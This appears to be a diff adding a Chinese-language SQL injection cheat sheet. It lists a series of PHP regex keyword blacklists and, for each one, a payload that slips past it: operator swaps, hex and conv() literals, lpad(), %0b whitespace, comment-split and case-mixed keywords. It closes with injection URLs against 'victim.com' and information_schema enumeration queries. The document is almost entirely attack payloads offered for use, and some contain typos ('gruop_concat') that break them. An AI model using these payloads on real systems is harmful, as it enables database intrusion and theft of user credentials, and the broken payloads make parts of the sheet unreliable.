@@ -1,0 +1,85 @@
+SQL注入过滤与绕过
+
+1、关键词过滤：and 和 or
+
+过滤场景1:  1 or 1 = 1          1 and 1 = 1
+绕过方式1： 1 || 1 = 1          1 && 1 = 1
+
+2、关键词过滤： and、or、union
+
+过滤场景2： preg_match('/(and|or|union)/i', $id)
+应用场景2： union select user, password from users
+绕过方式2： 1 || (select user from users where user_id = 1) = 'admin'
+
+3、关键词过滤： and、or、union、where
+
+过滤场景3： preg_match('/(and|or|union|where)/i', $id)
+应用场景3： 1 || (select user from users where user_id = 1) = 'admin'
+绕过方式3： 1 || (select user from users limit 1) = 'admin'
+
+4、关键词过滤： and、or、union、where、limit、group by
+
+过滤场景4： preg_match('/(and|or|union|where|limit|group by)/i', $id)
+应用场景4： 1 || (select user from users group by user_id having user_id = 1) = 'admin'
+绕过方式4： 1 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1
+
+5、关键词过滤： and, or, union, where, limit, group by, select, '
+
+过滤场景5： preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)
+应用场景5： 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1
+绕过方式5： 1 || user_id is not null
+绕过方式5： 1 || substr(user,1,1) = 0x61
+绕过方式5： 1 || substr(user,1,1) = unhex(61)
+
+6、关键词过滤： and, or, union, where, limit, group by, select, ', hex
+
+过滤场景6： preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)
+应用场景6： 1 || substr(user,1,1) = unhex(61)
+绕过方式6： 1 || substr(user,1,1) = lower(conv(11,10,36))
+
+7、关键词过滤： and, or, union, where, limit, group by, select, ', hex, substr
+
+过滤场景7： preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)
+应用场景7： 1 || substr(user,1,1) = lower(conv(11,10,36))
+绕过方式7： 1 || lpad(user,7,1)
+
+8、关键词过滤： and, or, union, where, limit, group by, select, ', hex, substr, white space
+
+过滤场景8： preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)
+应用场景8： 1 || lpad(user,7,1)
+绕过场景8： 1%0b||%0blpad(user,7,1)
+
+[Code]---------------------------------------------------------------		
+	filtered injection:		1 or 1 = 1
+	Bypassed injection:		1 or 1
+	[End Code]----------------------------------------------------------- 
+
+	[Code]---------------------------------------------------------------		
+	filtered injection:		1 union select 1, table_name from information_schema.tables where table_name = 'users'
+	filtered injection:		1 union select 1, table_name from information_schema.tables where table_name between 'a' and 'z'
+	filtered injection:		1 union select 1, table_name from information_schema.tables where table_name between char(97) and char(122)
+	Bypassed injection:		1 union select 1, table_name from information_schema.tables where table_name between 0x61 and 0x7a
+	Bypassed Injection:		1 union select 1, table_name from information_schema.tables where table_name like 0x7573657273
+[End Code]----------------------------------------------------------- 
+
+空格绕过：
+
+[Code]---------------------------------------------------------------		
+	http://victim.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3--
+[End Code]-----------------------------------------------------------
+
+大小写绕过：
+
+[Code]---------------------------------------------------------------		
+	http://victim.com/news.php?id=1+UnIoN/**/SeLecT/**/1,2,3--
+[End Code]-----------------------------------------------------------
+
+关键词过滤：
+
+[Code]---------------------------------------------------------------		
+	http://victim.com/news.php?id=1+UNunionION+SEselectLECT+1,2,3--
+	http://victim.com/news.php?id=1+uni%0bon+se%0blect+1,2,3--
+	http://victim.com/main/news/id/1/**/||/**/lpad(first_name,7,1).html
+	http://victim.com/main/news/id/1%0b||%0blpad(first_name,7,1).html
+[End Code]-----------------------------------------------------------
+
